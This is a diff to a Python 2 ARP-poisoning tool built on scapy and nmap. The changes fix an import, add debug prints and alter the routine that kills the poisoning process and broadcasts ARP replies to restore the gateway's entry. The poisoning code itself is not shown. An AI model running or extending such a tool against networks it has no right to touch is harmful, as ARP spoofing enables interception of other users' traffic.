@@ -1,15 +1,18 @@
 from multiprocessing import Process
 import os
 import sys
-from scapy.all import sendp,Ether,ARP,get_if_hwaddr,getmacbyip,RadioTap,config
+from scapy.all import sendp,Ether,ARP,get_if_hwaddr,getmacbyip,RadioTap,conf
 import time
 from random import randint
 from datetime import datetime
 import nmap
-
 import gen_utils as gu
-
 conf.verb = 0 #shut the fuck up scapy
+
+
+DEBUG = False
+
+
 
 if not os.geteuid() == 0:
     sys.exit('Script must be run as root user!')
@@ -23,6 +26,11 @@ class Arp_poison:
         self.poison_pid = 0
         self.router_mac = getmacbyip(self.gateway)
         self.wireless = False  # currently this flag needs to be set manually
+        if DEBUG:
+            print self.iface
+            print self.mac
+            print self.gateway
+            print self.router_mac
         with open("/tmp/fun&games.log", "a") as f:
             f.write("Started a session on ip: " + self.pub_ip + " at " + str(datetime.now()) + "\n")
 
@@ -69,12 +77,11 @@ class Arp_poison:
 
     def restore_arp_table(self):
         if not self.poison_pid == 0 or not self.poison_pid == None:
-            print self.poison_pid
             os.kill(self.poison_pid, 9)
             if self.wireless == False:
-                pkt = Ether()/ARP(op="is-at", psrc=self.gateway, hwsrc=self.router_mac, hwdst="FF:FF:FF:FF:FF:FF")
+                pkt = Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=self.gateway, hwsrc=self.router_mac)
             else:
-                pkt = RadioTap()/ARP(op="is-at", psrc=self.gateway, hwsrc=self.router_mac, hwdst="FF:FF:FF:FF:FF:FF")
+                pkt = RadioTap()/ARP(op="is-at", psrc=self.gateway, hwsrc=self.router_mac)
             sendp(pkt, iface= self.iface, inter=0.2, count=40)
             self.poison_pid = 0
         else:
